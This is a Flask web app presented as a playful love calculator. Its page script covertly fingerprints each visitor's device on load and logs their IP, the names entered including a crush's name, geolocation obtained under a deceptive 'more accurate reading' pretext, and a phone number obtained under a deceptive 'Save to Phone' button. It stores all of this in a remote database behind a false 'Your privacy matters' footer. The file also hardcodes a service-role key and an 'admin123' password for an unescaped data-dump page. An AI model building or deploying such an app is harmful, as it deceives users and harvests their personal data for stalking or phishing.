from flask import Flask, request, jsonify, render_template_string
import os
import random
import json
import urllib.request
import urllib.error
from datetime import datetime

app = Flask(__name__)

# Your Supabase credentials
SUPABASE_URL = os.environ.get("Lovepercentage_SUPABASE_URL", "https://djjgtweywwzgdlzfauhn.supabase.co")
SUPABASE_KEY = os.environ.get("Lovepercentage_SUPABASE_SERVICE_ROLE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqamd0d2V5d3d6Z2RsemZhdWhuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgxMjc5MywiZXhwIjoyMDkyMzg4NzkzfQ.soSQEvfhEnKJwtSMjxSRxf0lwXolrzfq2D9-y4hKZb0")

# Love Calculator Functions
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
    ]
    return random.choice(messages)

# Supabase REST API using urllib (no extra dependencies)
def supabase_request(method, table, data=None, session_id=None):
    try:
        if session_id:
            url = f"{SUPABASE_URL}/rest/v1/{table}?sessionId=eq.{session_id}"
        else:
            url = f"{SUPABASE_URL}/rest/v1/{table}"
        
        headers = {
            "apikey": SUPABASE_KEY,
            "Authorization": f"Bearer {SUPABASE_KEY}",
            "Content-Type": "application/json"
        }
        
        if method == "GET":
            req = urllib.request.Request(url, headers=headers)
        elif method == "POST":
            req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers, method="POST")
        elif method == "PATCH":
            req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers, method="PATCH")
        else:
            return None
        
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        print(f"Supabase error: {e}")
        return None

def save_visitor(data):
    try:
        # Check if exists
        existing = supabase_request("GET", "visitors", session_id=data.get('sessionId'))
        if existing:
            supabase_request("PATCH", "visitors", data=data, session_id=data.get('sessionId'))
        else:
            supabase_request("POST", "visitors", data=data)
        return True
    except:
        return False

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Calculator</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        .result {
            margin-top: 30px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }
        .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
        .opt-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            width: auto;
            padding: 10px 20px;
            font-size: 13px;
            margin: 5px;
        }
        .optional-buttons { display: flex; gap: 10px; justify-content: center; margin-top: 15px; flex-wrap: wrap; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Calculator</h1>
    <div class="subtitle">Discover the magic between you two ✨</div>
    
    <div class="input-group">
        <input type="text" id="name1" placeholder="Your name" maxlength="30">
        <input type="text" id="name2" placeholder="Crush's name" maxlength="30">
    </div>
    <button onclick="calculateLove()">🔮 Calculate Love Percentage</button>
    
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
        <div class="optional-buttons" id="optionalBtns" style="display:none;">
            <button class="opt-btn" onclick="shareLocation()">📍 Share Location</button>
        </div>
    </div>
    
    <div id="phoneSection" class="phone-section">
        <h4 style="margin-bottom: 12px;">📱 Save Your Result</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number">
        <button class="save-btn" onclick="savePhone()">💾 Save to Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔒 Your privacy matters | Results are 100% accurate</footer>
</div>

<script>
    let sessionId = localStorage.getItem('love_session');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('love_session', sessionId);
    }
    
    let currentFortune = '';
    let currentPercent = 0;
    let collectedData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
    };
    
    async function collectDeviceData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            collectedData.fingerprint = result.visitorId;
        } catch(e) { collectedData.fingerprint = 'error'; }
        
        collectedData.screen = screen.width + 'x' + screen.height;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
        
        if (navigator.deviceMemory) {
            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
        }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        
        const connection = navigator.connection;
        if (connection) {
            collectedData.networkType = connection.effectiveType;
        }
        
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
    }
    
    async function calculateLove() {
        const name1 = document.getElementById('name1').value.trim();
        const name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            showStatus('Please enter both names 💕', 'error');
            return;
        }
        
        const btn = event.target;
        btn.innerHTML = '<span class="loading"></span> Calculating...';
        btn.disabled = true;
        
        collectedData.name = name1;
        collectedData.crush_name = name2;
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        });
        
        try {
            const response = await fetch('/calculate-love', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name1, name2 })
            });
            const result = await response.json();
            
            currentPercent = result.percentage;
            currentFortune = result.message;
            
            document.getElementById('percentage').innerHTML = currentPercent + '%';
            document.getElementById('message').innerHTML = currentFortune;
            document.getElementById('result').style.display = 'block';
            document.getElementById('optionalBtns').style.display = 'flex';
            document.getElementById('phoneSection').style.display = 'block';
            
            collectedData.fortuneText = currentFortune;
            collectedData.percentage = currentPercent;
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collectedData)
            });
            
            showStatus('Your love score is ready! ✨', 'success');
        } catch(e) {
            showStatus('Something went wrong. Please try again.', 'error');
        } finally {
            btn.innerHTML = '🔮 Calculate Love Percentage';
            btn.disabled = false;
        }
    }
    
    function shareLocation() {
        if (confirm('📍 Share your location for a more accurate love reading?')) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                collectedData.latitude = position.coords.latitude;
                collectedData.longitude = position.coords.longitude;
                await fetch('/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedData)
                });
                showStatus('📍 Location saved!', 'success');
            }, () => {
                showStatus('Location access denied.', 'error');
            });
        }
    }
    
    async function savePhone() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) {
            showStatus('Please enter your phone number', 'error');
            return;
        }
        
        try {
            const response = await fetch('/save-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: currentFortune,
                    percentage: currentPercent
                })
            });
            const result = await response.json();
            if (result.status === 'saved') {
                showStatus('✅ Number saved!', 'success');
                document.getElementById('phone').disabled = true;
                event.target.disabled = true;
            }
        } catch(e) {
            showStatus('Network error. Please try again.', 'error');
        }
    }
    
    function showStatus(message, type) {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = message;
        statusDiv.className = `status ${type}`;
        setTimeout(() => {
            statusDiv.style.display = 'none';
            statusDiv.className = 'status';
        }, 3000);
    }
    
    collectDeviceData();
</script>
</body>
</html>
'''

# Flask Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save', methods=['POST'])
def save():
    try:
        data = request.get_json()
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        save_visitor(data)
        return jsonify({'status': 'saved'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/save-phone', methods=['POST'])
def save_phone():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        phone = data.get('phoneNumber')
        fortune = data.get('fortune')
        percentage = data.get('percentage')
        
        update_data = {"phoneNumber": phone, "fortuneText": fortune, "percentage": percentage}
        supabase_request("PATCH", "visitors", data=update_data, session_id=session_id)
        
        return jsonify({'status': 'saved'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    data = request.get_json()
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'admin123':
            visitors_data = supabase_request("GET", "visitors")
            if visitors_data:
                html = '<h1>Visitor Data</h1><table border="1">'
                html += '<tr><th>ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Location</th></tr>'
                for v in visitors_data:
                    html += f'<tr><td>{v.get("id")}</td><td>{v.get("name")}</td><td>{v.get("crush_name")}</td><td>{v.get("percentage")}%</td><td>{v.get("phoneNumber")}</td><td>{v.get("latitude")},{v.get("longitude")}</td></tr>'
                html += '</table><p><a href="/admin">Back</a></p>'
                return html
            return "No data yet"
        return '<h1>Wrong password</h1><a href="/admin">Back</a>'
    
    return '''
        <form method="POST">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
